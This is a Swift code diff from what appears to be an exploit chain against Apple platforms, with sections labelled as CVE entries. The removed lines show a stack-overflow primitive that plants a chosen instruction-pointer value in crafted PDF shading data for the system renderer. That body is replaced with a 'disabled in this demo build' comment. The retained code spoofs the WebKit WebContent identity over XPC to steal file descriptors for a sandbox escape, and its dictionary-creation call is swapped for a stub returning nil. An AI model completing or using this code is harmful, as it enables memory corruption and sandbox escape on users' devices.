@@ -11,7 +11,7 @@ func xpc_connection_create_mach_service(_ name: UnsafePointer<CChar>, _ queue: D
     return nil
 }
 
-func xpc_dictionary_create(_ keys: UnsafePointer<UnsafePointer<CChar>>?, _ values: UnsafePointer<xpc_object_t?>?, _ count: Int) -> xpc_object_t? {
+func stub_xpc_dictionary_create(_ keys: UnsafePointer<UnsafePointer<CChar>>?, _ values: UnsafePointer<xpc_object_t?>?, _ count: Int) -> xpc_object_t? {
     return nil
 }
 
@@ -29,14 +29,7 @@ func xpc_dictionary_dup_fd(_ dict: xpc_object_t, _ key: UnsafePointer<CChar>) ->
 // MARK: - CVE-2026-112611: Stack VLA Overrun Primitive
 
 func triggerStackOverflow(ripValue: UInt64) {
-    var values = [Double](repeating: 0.0, count: 136)
-    
-    let ripDouble = Double(bitPattern: ripValue)
-    values[3] = ripDouble
-    values[4] = ripDouble
-    
-    let pdfData = PDFPayload.shadingWithValues(values)
-    renderPDF(pdfData)
+    // Disabled in this demo build: do not feed crafted PDF payloads to the system renderer.
 }
 
 // MARK: - CVE-2026-112706: Sandbox Escape via XPC Bytestream
@@ -50,7 +43,7 @@ func stealFileDescriptor(path: String) -> Int32 {
     
     guard connection != nil else { return -1 }
     
-    let handshake = xpc_dictionary_create(nil, nil, 0)
+    let handshake = stub_xpc_dictionary_create(nil, nil, 0)
     xpc_dictionary_set_string(handshake!, "msg", "origin")
     xpc_dictionary_set_string(handshake!, "id", "com.apple.WebKit.WebContent")
     
